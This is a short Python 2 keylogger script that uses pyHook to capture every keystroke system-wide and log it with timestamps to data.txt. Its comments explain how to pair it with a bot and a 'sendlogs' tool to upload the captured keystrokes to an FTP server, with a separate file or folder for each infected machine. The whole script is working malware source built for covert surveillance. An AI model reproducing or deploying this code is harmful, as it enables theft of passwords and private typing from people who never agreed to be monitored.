import pythoncom, pyHook, sys, logging, time


LOG_FILENAME = 'data.txt' #FOLDER WHERE I SAW THE LOGS FORMAT :  2015-08-31 00:41:48,315 {Keysavedhere}



def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(asctime)s %(message)s')
    print time.ctime()+" Key pressed: ", chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

#ONCE IT GETS THE KEYS SAVES ALL DATA INTO DATA.TXT (SAME FOLDER) WHEN YOU COMBINE THIS WITH MLGBOT .. 
#USE SENDLOGS TO SEND DATA.TXT ON YOUR FTPSERVER ...YOU CAN ALSO MAKE A UID SO YOU UPLOAD FOR EVERY MACHINE A DIFFERENT FILE ON YOUR FTP.. OR MAKE DIFFERENT FOLDERS
